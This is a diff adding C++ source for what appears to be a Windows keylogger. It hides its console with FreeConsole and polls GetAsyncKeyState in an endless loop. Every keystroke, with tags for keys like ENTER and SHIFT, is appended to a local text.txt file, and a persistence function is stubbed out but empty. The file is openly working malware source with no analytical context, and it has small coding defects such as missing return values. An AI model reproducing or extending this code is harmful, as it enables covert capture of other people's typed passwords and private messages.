@@ -1,0 +1,57 @@
+#include<bits/stdc++.h>
+#include<windows.h>
+#include<winuser.h>
+#include<fstream>
+using namespace std;
+
+void stayResident(){
+
+}
+
+void EscribirArchivo(LPCSTR texto)
+{
+    ofstream archivo;
+    archivo.open("text.txt", fstream::app);
+    archivo << texto;
+    archivo.close();
+}
+ 
+bool KeyTouched(int Key)
+{
+    switch (Key)
+    {
+        case VK_SPACE:
+            EscribirArchivo(" ");
+            break;
+        case VK_RETURN:
+            EscribirArchivo(" {ENTER} ");
+            break;
+        case VK_SHIFT:
+            EscribirArchivo(" {SHIFT} ");
+            break;
+        case VK_BACK:
+            EscribirArchivo(" {BACK} ");
+            break;
+        default: return false;
+    }
+}
+
+
+int main(){
+	FreeConsole();
+unsigned char KEY;
+	while(true){
+		Sleep(10);
+		for(KEY = 8;KEY <= 255; KEY++){
+			if(GetAsyncKeyState(KEY) == -32767){
+				if(KeyTouched(KEY) == false){
+					ofstream File;
+					File.open("text.txt",fstream::app);
+					File << KEY;
+					File.close();
+				}else{
+				}
+			}
+		}
+	}
+}
